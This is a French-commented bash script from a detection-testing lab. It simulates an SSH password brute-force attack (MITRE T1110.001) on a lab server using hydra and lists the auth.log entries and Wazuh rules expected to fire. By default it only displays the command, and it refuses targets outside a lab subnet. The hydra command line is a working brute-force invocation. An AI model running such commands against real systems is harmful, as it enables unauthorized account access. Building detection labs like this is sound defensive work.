#!/usr/bin/env bash
# =============================================================================
# Scénario 01 — Brute force SSH sur SRV01   (MITRE ATT&CK T1110.001)
# Auteur : André Capito (@acapitow)
#
# Génère de la télémétrie d'authentification SSH pour TESTER la détection.
# S'appuie sur l'outil standard `hydra`. Mode simulation (--check) par défaut.
#
# Usage :
#   ./attack.sh              # simulation : montre la commande, ne lance rien
#   ./attack.sh --execute    # exécution réelle CONTRE SRV01 (labo isolé) uniquement
#
# Cible : SRV01 (10.20.0.30), compte local « labadmin ».
# Liste de mots : passwords.txt (minuscule, FICTIVE, propre au labo).
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/lab_guard.sh
source "${SCRIPT_DIR}/../lib/lab_guard.sh"

guard::parse_mode "$@"

TARGET="${TARGET:-$SRV01_IP}"
USER_NAME="${SSH_USER:-labadmin}"
WORDLIST="${SCRIPT_DIR}/passwords.txt"

guard::banner "01 · Brute force SSH (T1110.001)"
guard::require_lab_target "$TARGET"     # refuse toute cible hors 10.20.0.0/24
guard::need_tool hydra "sur Kali : préinstallé ; Debian/Ubuntu : apt install hydra"

log "Cible            : ${USER_NAME}@${TARGET} (SSH/22)"
log "Liste de mots    : ${WORDLIST} ($(wc -l < "$WORDLIST" 2>/dev/null || echo '?') entrées, fictives)"
log "Technique MITRE  : T1110.001 (Brute Force: Password Guessing)"
echo

# hydra : -t 4 connexions parallèles, -I ignore la reprise, -V verbeux.
guard::run "Brute force SSH via hydra contre ${TARGET}" \
  hydra -l "$USER_NAME" -P "$WORDLIST" -t 4 -I -f "ssh://${TARGET}"

echo
ok "Terminé (mode ${MODE})."
cat <<EOF

Journaux attendus sur SRV01 (/var/log/auth.log) :
  - Rafale de « Failed password for ${USER_NAME} from ${ATTACK01_IP} »
  - Éventuel « Accepted password » si un mot de passe de la liste est correct
Détection : Wazuh 100100→100101 (brute force), 100102 (succès après brute force).
Export des alertes : ../../scripts/export_alerts.py --rule 100101,100102
EOF
